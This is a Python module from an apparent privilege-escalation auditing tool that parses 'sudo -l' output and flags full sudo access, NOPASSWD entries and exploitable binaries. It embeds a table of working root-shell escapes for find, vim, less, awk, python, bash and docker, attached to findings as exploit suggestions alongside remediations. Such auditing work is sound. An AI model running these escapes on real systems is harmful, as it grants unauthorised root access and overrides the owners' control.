"""
Sudo configuration check module.
Identifies sudo misconfigurations that allow privilege escalation.
"""

import re
from typing import List, Set
from checks.base_check import BaseCheck, Finding, Severity
from utils.helpers import SystemHelpers


class SudoCheck(BaseCheck):
    """Check for sudo misconfigurations."""
    
    # Verified exploits with reliability ratings
    EXPLOITABLE_COMMANDS = {
        'find': {
            'exploit': 'sudo find . -exec /bin/sh \\; -quit',
            'reliability': 'high',
            'notes': 'Classic sudo exploit - works reliably'
        },
        'vim': {
            'exploit': 'sudo vim -c ":!/bin/sh"',
            'reliability': 'high',
            'notes': 'Escape to shell from vim'
        },
        'vi': {
            'exploit': 'sudo vi -c ":!/bin/sh"',
            'reliability': 'high',
            'notes': 'Escape to shell from vi'
        },
        'less': {
            'exploit': 'sudo less /etc/passwd\nThen type: !/bin/sh',
            'reliability': 'high',
            'notes': 'Requires interactive session'
        },
        'awk': {
            'exploit': 'sudo awk \'BEGIN {system("/bin/sh")}\'',
            'reliability': 'high',
            'notes': 'Works on most systems'
        },
        'python': {
            'exploit': 'sudo python -c \'import os; os.execl("/bin/sh", "sh")\'',
            'reliability': 'high',
            'notes': 'Python must be installed'
        },
        'bash': {
            'exploit': 'sudo bash -p',
            'reliability': 'high',
            'notes': 'Uses -p to preserve privileges'
        },
        'sh': {
            'exploit': 'sudo sh -p',
            'reliability': 'high',
            'notes': 'Uses -p to preserve privileges'
        },
        'docker': {
            'exploit': 'sudo docker run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh',
            'reliability': 'high',
            'notes': 'Gives root access via Docker'
        }
    }
    
    def __init__(self):
        super().__init__()
        self.seen_commands: Set[str] = set()
    
    def run(self, *args, **kwargs) -> List[Finding]:
        """Analyze sudo configuration."""
        # Run sudo -l to get allowed commands
        stdout, stderr, code = SystemHelpers.run_command(['sudo', '-l'])
        
        if code == 0 and stdout:
            current_user = SystemHelpers.get_current_user()
            
            # Check for full sudo access (ALL:ALL) - THIS IS 100% RELIABLE
            if '(ALL) ALL' in stdout or '(ALL : ALL) ALL' in stdout or 'ALL=(ALL:ALL) ALL' in stdout:
                self.findings.append(Finding(
                    title="Full Sudo Access",
                    description=f"User {current_user} has unrestricted sudo access (ALL:ALL). This allows full system compromise immediately.",
                    severity=Severity.CRITICAL,
                    exploit_suggestion="[RELIABILITY: 100%]\n\nImmediate root access:\nsudo su -\n\nOr:\nsudo -i\n\nOr:\nsudo /bin/bash",
                    remediation="Restrict sudo access to specific commands using sudoers configuration",
                    metadata={
                        'sudo_line': 'ALL ALL=(ALL:ALL) ALL',
                        'reliability': 'high'
                    }
                ))
                return self.findings  # No need to check other sudo configs
            
            # Look for NOPASSWD
            if 'NOPASSWD' in stdout:
                self.findings.append(Finding(
                    title="Sudo Without Password",
                    description=f"User {current_user} can run commands with sudo without a password.",
                    severity=Severity.CRITICAL,
                    exploit_suggestion="[RELIABILITY: 100% for allowed commands]\n\nRun any allowed sudo command immediately without authentication",
                    remediation="Remove NOPASSWD directive from sudoers file",
                    metadata={
                        'sudo_line': [l for l in stdout.split('\n') if 'NOPASSWD' in l],
                        'reliability': 'high'
                    }
                ))
            
            # Parse allowed commands
            for cmd_name, exploit_info in self.EXPLOITABLE_COMMANDS.items():
                if cmd_name in stdout:
                    # Deduplicate
                    if cmd_name not in self.seen_commands:
                        self.seen_commands.add(cmd_name)
                        self.findings.append(Finding(
                            title=f"Exploitable Sudo Command: {cmd_name}",
                            description=f"User can run {cmd_name} with sudo. This command is known to be exploitable for privilege escalation.",
                            severity=Severity.CRITICAL,
                            exploit_suggestion=f"[RELIABILITY: {exploit_info['reliability'].upper()}]\n{exploit_info['exploit']}\n\nNote: {exploit_info['notes']}",
                            remediation=f"Remove sudo access for {cmd_name} or restrict arguments",
                            metadata={
                                'command': cmd_name, 
                                'reliability': exploit_info['reliability']
                            }
                        ))
        
        return self.findings